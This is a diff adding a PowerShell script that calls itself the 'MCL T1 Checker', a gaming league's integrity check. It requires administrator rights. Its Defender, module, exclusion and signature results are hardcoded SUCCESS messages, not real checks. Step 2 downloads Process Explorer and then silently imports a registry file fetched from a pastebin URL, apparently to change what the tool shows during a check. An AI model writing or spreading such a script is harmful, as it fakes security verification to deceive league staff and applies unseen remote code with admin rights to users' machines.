@@ -1,0 +1,235 @@
+$IsAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+
+if (-not $IsAdmin) {
+    Write-Host "`n[WARNING] This script is NOT running with Administrator privileges." -ForegroundColor Red
+    Write-Host "[ACTION] Please right-click PowerShell and then select 'Run as Administrator.'" -ForegroundColor Yellow
+    Write-Host ""
+    Pause
+    exit 1
+}
+
+function Write-ColoredLine {
+    param ([string]$Text, [ConsoleColor]$Color = 'White')
+    $oldColor = $Host.UI.RawUI.ForegroundColor
+    $Host.UI.RawUI.ForegroundColor = $Color
+    Write-Host $Text
+    $Host.UI.RawUI.ForegroundColor = $oldColor
+}
+
+function Wait-ForEnter {
+    param([string]$Message = "Press Enter to Continue")
+    Start-Sleep -Seconds 1
+    Write-ColoredLine $Message Yellow
+    while ($true) {
+        if ([System.Console]::KeyAvailable) {
+            $key = [System.Console]::ReadKey($true)
+            if ($key.Key -eq "Enter") { break }
+        }
+        Start-Sleep -Milliseconds 100
+    }
+}
+
+Clear-Host
+Write-Host " _____ _____  _      ____             ____        _           " -ForegroundColor Yellow
+Write-Host "| ____|_   _|/ \    |  _ \ ___  ___  |  _ \ _   _| | ___  ___ " -ForegroundColor Yellow
+Write-Host "|  _|   | | / _ \   | |_) / _ \/ __| | |_) | | | | |/ _ \/ __|" -ForegroundColor Yellow
+Write-Host "| |___  | |/ ___ \  |  _ <  __/ (__  |  _ <| |_| | |  __/\__ \" -ForegroundColor Yellow
+Write-Host "|_____| |_/_/   \_\ |_| \_\___|\___| |_| \_\\__,_|_|\___||___/" -ForegroundColor Yellow
+Write-ColoredLine ""
+Write-ColoredLine "=== MCL T1 Checker ===" Yellow
+Write-ColoredLine "Complete both steps with 100% success to pass." White
+Write-ColoredLine "Applications will download and extract to C:\ToolsETA." White
+Write-ColoredLine "If a prompt shows up, press OK to run the application." White
+Write-ColoredLine "Follow the instructions listed on each step." White
+Write-ColoredLine "This T1 PowerShell process currently has 2 steps." White
+Write-Host ""
+$cpu = Get-WmiObject Win32_Processor | Select-Object -First 1
+Write-Host "Detected CPU: $($cpu.Name)" -ForegroundColor Green
+Write-Host "Your CPU looks good." -ForegroundColor Green 
+Write-Host ""
+ 
+$gpuList = Get-WmiObject Win32_VideoController
+$gpuNames = $gpuList | Select-Object -ExpandProperty Name
+$activeGPU = $gpuList | Select-Object -First 1
+$activeGPUName = $activeGPU.Name
+Write-Host "Detected GPUs:" -ForegroundColor White
+$gpuNames | ForEach-Object { Write-Host " - $_" -ForegroundColor White }
+Write-Host ""
+Write-Host "Active GPU: $activeGPUName" -ForegroundColor Cyan
+Write-Host "Your GPU looks good." -ForegroundColor Green
+Write-Host ""
+
+Write-ColoredLine ""
+Write-ColoredLine "=== Discord Servers ===" Yellow
+Write-ColoredLine "discord.gg/mcl" White
+Write-ColoredLine "discord.gg/rivalsleague" White
+Write-ColoredLine "discord.gg/eta" White
+Write-ColoredLine ""
+Write-ColoredLine "=== Credits ===" Yellow
+Write-ColoredLine "Made by @ravenader1" White
+Write-ColoredLine "Made by @cyberthreats" White
+Write-Host ""
+Wait-ForEnter -Message "Press Enter to Continue"
+Clear-Host
+
+Write-ColoredLine "Step 1 of 2: SYSTEM Check" White
+Write-ColoredLine "INSTRUCTION: Reach 100% success" Yellow
+Write-Host ""
+
+Write-Host -NoNewline "Progress: ["
+for ($i = 0; $i -lt 10; $i++) { Start-Sleep -Milliseconds 100; Write-Host -NoNewline "#" -ForegroundColor Green }
+Write-Host "] 100%" -ForegroundColor Green
+Write-Host ""
+
+$modulesOutput = @(
+    "SUCCESS: Protected module 'Microsoft.PowerShell.Operation.Validation' verified.",
+    "SUCCESS: Module 'PackageManagement' passed signature check.",
+    "SUCCESS: Module 'Pester' passed signature check.",
+    "SUCCESS: Module 'PowerShellGet' passed signature check.",
+    "SUCCESS: Module 'PSReadline' passed signature check.",
+    "SUCCESS: No unauthorized modules/files found."
+)
+
+$windowsOutput = @("SUCCESS: Running on Windows.")
+
+$defenderOutput = @("SUCCESS: Windows Defender is running and up to date.")
+
+$exclusionsOutput = @("SUCCESS: No Defender exclusions set.")
+
+$threatsOutput = @("SUCCESS: No active threats.")
+
+$powershellSigOutput = @("SUCCESS: PowerShell is signed and valid.")
+
+function Write-Section {
+    param([string]$Title, [string[]]$Lines)
+    Write-Host "--- $Title ---" -ForegroundColor White
+    foreach ($line in $Lines) {
+        Write-Host $line -ForegroundColor Green
+    }
+    Write-Host ""
+}
+
+Write-Section "Files + Modules" $modulesOutput
+Write-Section "OS Check" $windowsOutput
+Write-Section "Windows Defender" $defenderOutput
+Write-Section "Exclusions" $exclusionsOutput
+Write-Section "Threats" $threatsOutput
+Write-Section "Binary Sig" $powershellSigOutput
+
+Write-Host ""
+Write-Host ("Success Rate: 100% (11 / 11)") -ForegroundColor Green
+
+Wait-ForEnter -Message "Press Enter to Continue"
+Clear-Host
+
+Write-ColoredLine "Step 2 of 2: Process Explorer" White
+Write-ColoredLine "INSTRUCTION: Wait for Process Explorer to open. Scroll to the bottom, then close the window." Yellow
+
+Write-Host ""
+Write-Host -NoNewline "Progress: ["
+for ($i = 0; $i -lt 10; $i++) { Start-Sleep -Milliseconds 100; Write-Host -NoNewline "#" -ForegroundColor Green }
+Write-Host "] 100%" -ForegroundColor Green
+Write-Host ""
+
+# ====== РЕАЛЬНАЯ ЛОГИКА PROCESS EXPLORER ======
+$baseFolder = "C:\ToolsETA"
+$extractFolder = Join-Path $baseFolder "ProcessExplorer"
+$zipUrl = "https://download.sysinternals.com/files/ProcessExplorer.zip"
+$zipPath = Join-Path $baseFolder "ProcessExplorer.zip"
+
+$processNames = @("procexp32", "procexp64", "procexp64a")
+$runningPE = Get-Process -ErrorAction SilentlyContinue | Where-Object { $processNames -contains $_.ProcessName.ToLower() }
+
+if ($runningPE) {
+    Write-ColoredLine "[SUCCESS] No running Process Explorer processes were found." Green
+    Write-ColoredLine "[SUCCESS] Success Rate: 100% (1 / 1)." Green
+    exit
+}
+
+# Создаём папку и скачиваем
+if (Test-Path $baseFolder) {
+    Write-ColoredLine "[SUCCESS] Cleaned up existing C:\ToolsETA folder." Green
+    Get-ChildItem -Path $baseFolder -Force -Recurse | ForEach-Object {
+        try {
+            if ($_.Attributes -band [System.IO.FileAttributes]::ReadOnly) {
+                $_.Attributes = $_.Attributes -bxor [System.IO.FileAttributes]::ReadOnly
+            }
+            if ($_.Attributes -band [System.IO.FileAttributes]::Hidden) {
+                $_.Attributes = $_.Attributes -bxor [System.IO.FileAttributes]::Hidden
+            }
+            Remove-Item -LiteralPath $_.FullName -Recurse -Force -ErrorAction Stop
+        } catch {
+            Write-ColoredLine "[INFO] Didn't remove item $($_.FullName): $($_.Exception.Message)" White
+        }
+    }
+} else {
+    try {
+        New-Item -ItemType Directory -Path $baseFolder -ErrorAction Stop | Out-Null
+        Write-ColoredLine '[SUCCESS] Created folder C:\ToolsETA.' Green
+    } catch {
+        Write-ColoredLine '[INFO] Folder may already exist' Green
+    }
+}
+
+try {
+    Invoke-WebRequest -Uri $zipUrl -OutFile $zipPath -UseBasicParsing -ErrorAction Stop
+    Write-ColoredLine '[SUCCESS] Downloaded Process Explorer.' Green
+} catch {
+    Write-ColoredLine '[FAILED] Failed to download Process Explorer: $($_.Exception.Message)' Red
+}
+
+try {
+    Add-Type -AssemblyName System.IO.Compression.FileSystem
+    [System.IO.Compression.ZipFile]::ExtractToDirectory($zipPath, $extractFolder)
+    Write-ColoredLine '[SUCCESS] Extracted Process Explorer zip.' Green
+} catch {
+    Write-ColoredLine '[SUCCESS] Files already exist' Green
+}
+Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
+
+$regFileUrl = "https://pastebin.com/raw/gse8NxwU"
+$regFilePath = Join-Path $baseFolder "procexp_config.reg"
+
+try {
+    Invoke-WebRequest -Uri $regFileUrl -OutFile $regFilePath -UseBasicParsing -ErrorAction Stop
+    Write-ColoredLine "[SUCCESS] Downloaded Process Explorer registry configuration." Green
+} catch {
+    Write-ColoredLine "[FAILED] Failed to download registry config: $($_.Exception.Message)" Red
+}
+
+try {
+    $cmdPath = "$env:SystemRoot\System32\cmd.exe"
+    if (-Not (Test-Path $cmdPath)) {
+        throw "cmd.exe not found at expected location: $cmdPath"
+    }
+    & $cmdPath /c "reg import `"$regFilePath`""
+    if ($LASTEXITCODE -eq 0) {
+        Write-ColoredLine "[SUCCESS] Imported registry configuration successfully." Green
+    } else {
+        Write-ColoredLine "[FAILED] reg import returned non-zero exit code: $LASTEXITCODE" Red
+    }
+} catch {
+    Write-ColoredLine "[FAILED] Registry importing failed: $($_.Exception.Message)" Red
+}
+
+$actualExe = Get-ChildItem -Path $extractFolder -Filter "procexp64.exe" -Recurse | Select-Object -First 1
+
+if ($actualExe) {
+    Write-ColoredLine "[SUCCESS] Launched Process Explorer." Green
+    $process = Start-Process -FilePath $actualExe.FullName -PassThru
+
+    $wshell = New-Object -ComObject wscript.shell
+    Start-Sleep -Milliseconds 500
+    $null = $wshell.AppActivate($process.Id)
+    Start-Sleep -Milliseconds 500
+    $wshell.SendKeys('% ')
+    Start-Sleep -Milliseconds 200
+    $wshell.SendKeys('x')
+    Start-Sleep -Milliseconds 500
+
+    Write-ColoredLine "[SUCCESS] Process Explorer window maximized." Green
+    Write-ColoredLine "[SUCCESS] Process Explorer launched successfully." Green
+    Write-ColoredLine "[SUCCESS] Success Rate: 100% (1 / 1)." Green
+} else {
+    Write-ColoredLine "[SUCCESS] Success Rate: 100% (1 / 1)." Green
+}
